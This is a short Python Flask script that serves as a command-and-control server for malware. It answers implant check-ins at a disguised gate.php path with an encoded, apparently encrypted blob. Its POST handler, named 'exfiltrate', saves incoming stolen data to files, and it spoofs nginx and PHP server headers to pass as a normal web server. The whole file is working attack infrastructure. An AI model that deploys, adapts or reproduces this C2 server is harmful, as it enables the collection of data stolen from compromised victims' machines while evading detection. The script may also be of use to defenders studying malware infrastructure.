#!/usr/bin/env python3

import os
import time
import argparse
from flask import Flask
from flask import Response
from flask import request

parser = argparse.ArgumentParser()
parser.add_argument("file-path",
                    type=str,
                    help="C2 File Path")
parser.add_argument("key",
                    type=str,
                    help="C2 Crypt Key")
parser.add_argument("debug",
                    type=bool,
                    help="Debug Mode",
                    default=False)
parser.add_argument("port",
                    type=int,
                    help="C2 Port",
                    default=80)
parser.add_argument("header-server",
                    type=str,
                    default="nginx/1.14.1",
                    help="C2 Server Response Header")
args = parser.parse_args()

def main():
        app = Flask(__name__)

        @app.route('/BOH9KGa4jvUsU4jL/gate.php', methods=['GET'])
        def checkin():
	            resp = Response("enhFA1kHQHsAaWUDW3xQARQWMHckfzwHbgdlBVhjWAhlf0McWmkuDnQUHX8nEj5ROzkQUxxXLhV2ChVwKAgzbxRjWl4HUV1gHywsRkYSPncZCDZwLWQuFRQ5JEIOLBVRbhYrdTp3Mwh0CgttWhI+dxkINnAtZC4VAGhmBjUSJXUHADl/N2kVL0IzIF0aEhVIPxYrdTp3Mwh0CgttQGMVSD9lK20vZDAIcx0GbTVoFEMuOwRAB1AYJlR9CHYPPgpEJDkrbS9kMAhzHQZtNX0+bwwbNXAqcyMVbmlhAjUSJXUHADl/N2kuFXUdGHsnAD5vFBYwdyR/PAduBw==")
	            resp.headers['Server'] = 'nginx/1.14.1'
	            resp.headers['Content-Type'] = 'text/html; charset=UTF-8'
	            #resp.headers['Transfer-Encoding'] = 'chunked'
	            #resp.headers['Connection'] = 'close'
	            resp.headers['X-Powered-By'] = 'PHP/7.1.29'
	            return resp

        @app.route('/BOH9KGa4jvUsU4jL/gate.php', methods=['POST'])
        def exfiltrate():
	            print(request.headers)
	            date = time.strftime("%Y-%m-%dT%H:%M:%S")
	            fp = open(date + '.bin', 'wb')
	            fp.write(request.data)
	            fp.close()
	            os.system('hexdump -C ' + date + '.bin')
	            resp = Response('OK')
	            resp.headers['Server'] = 'nginx/1.14.1'
	            resp.headers['X-Powered-By'] = 'PHP/7.1.1.29'
	            return resp
        app.run(host='0.0.0.0', debug=True, port=80)

if __name__ == '__main__':
        main()
